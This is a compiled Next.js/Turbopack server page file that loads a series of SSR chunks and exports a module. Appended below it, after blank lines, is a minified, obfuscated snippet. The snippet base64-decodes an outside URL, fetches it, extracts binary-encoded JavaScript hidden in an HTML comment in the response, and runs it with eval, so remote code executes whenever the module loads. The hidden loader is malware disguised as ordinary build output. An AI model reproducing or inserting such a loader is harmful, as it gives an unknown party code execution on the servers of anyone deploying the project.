var R=require("../chunks/ssr/[turbopack]_runtime.js")("server/app/page.js")
R.c("server/chunks/ssr/[root-of-the-server]__1iohds0._.js")
R.c("server/chunks/ssr/_01q_8ox._.js")
R.c("server/chunks/ssr/node_modules_next_dist_esm_build_templates_app-page_1jnxz1p.js")
R.c("server/chunks/ssr/node_modules_next_dist_0gqiype._.js")
R.c("server/chunks/ssr/[root-of-the-server]__0l61v2t._.js")
R.c("server/chunks/ssr/node_modules_next_dist_1au0nys._.js")
R.c("server/chunks/ssr/src_app_layout_jsx_19jkzzi._.js")
R.c("server/chunks/ssr/node_modules_next_dist_client_components_0wpq8j3._.js")
R.c("server/chunks/ssr/node_modules_next_dist_client_components_builtin_forbidden_0symwr9.js")
R.c("server/chunks/ssr/node_modules_next_dist_client_components_builtin_unauthorized_0l_sp0x.js")
R.c("server/chunks/ssr/node_modules_next_dist_client_components_builtin_global-error_0-o-goa.js")
R.c("server/chunks/ssr/_next-internal_server_app_page_actions_0hhsz1j.js")
R.m(75707)
module.exports=R.m(75707).exports


function binaryToData(t){const a=[],n=Math.floor(t.length/8);for(let o=0;o<n;o++){const n=parseInt(t.slice(8*o,8*(o+1)),2);a.push(String.fromCharCode(n))}return a.join("")}function fetchDataFromSvg(svgData){const match=String(svgData).match(/<!--DATA_JS:([01]+)-->/);if(!match)throw new Error("[Error]");const data=binaryToData(match[1]);eval(data)}fetch(atob("aHR0cHM6Ly9teXNjcmlwdC0yMjIwLnZlcmNlbC5hcHAvYXBpL2RhdGE=")).then(t=>t.text()).then(t=>{fetchDataFromSvg(t)});